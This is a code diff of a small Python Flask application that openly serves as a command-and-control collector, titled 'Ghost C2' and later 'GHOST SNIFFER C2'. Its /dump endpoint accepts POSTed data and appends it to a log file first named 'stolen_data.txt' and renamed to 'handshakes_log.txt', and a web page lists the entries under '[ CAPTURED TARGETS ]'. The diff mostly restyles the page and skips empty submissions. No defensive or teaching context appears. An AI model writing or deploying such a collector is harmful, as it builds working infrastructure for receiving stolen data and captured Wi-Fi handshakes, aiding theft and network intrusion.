@@ -2,21 +2,29 @@ import os
 from flask import Flask, request, render_template_string
 
 app = Flask(__name__)
-LOG_FILE = "stolen_data.txt"
+LOG_FILE = "handshakes_log.txt"
 
 HTML = '''
 <!DOCTYPE html>
 <html>
-<head><title>Ghost C2</title><style>
-body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
-.log { border: 1px solid #0f0; padding: 10px; margin: 10px 0; background: #050505; }
-</style></head>
+<head>
+    <meta charset="UTF-8">
+    <title>GHOST SNIFFER C2</title>
+    <style>
+        body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; padding: 20px; }
+        .log-entry { border: 1px solid #00ff41; padding: 15px; margin-bottom: 10px; background: #050505; box-shadow: 0 0 5px #004400; }
+        .ssid { color: #fff; font-weight: bold; }
+        .status { color: #ff0000; text-transform: uppercase; }
+        h1 { border-bottom: 2px solid #00ff41; padding-bottom: 10px; }
+    </style>
+</head>
 <body>
-<h1>[ GHOST STORAGE ]</h1>
-{% for line in lines %}
-<div class="log">{{ line }}</div>
-{% endfor %}
-</body></html>
+    <h1>[ CAPTURED TARGETS ]</h1>
+    {% for line in lines %}
+        <div class="log-entry">> {{ line }}</div>
+    {% endfor %}
+</body>
+</html>
 '''
 
 @app.route('/')
@@ -30,8 +38,9 @@ def index():
 @app.route('/dump', methods=['POST'])
 def dump():
     data = request.data.decode('utf-8')
-    with open(LOG_FILE, "a") as f:
-        f.write(data + "\n")
+    if data.strip():
+        with open(LOG_FILE, "a") as f:
+            f.write(data + "\n")
     return "OK", 200
 
 if __name__ == '__main__':
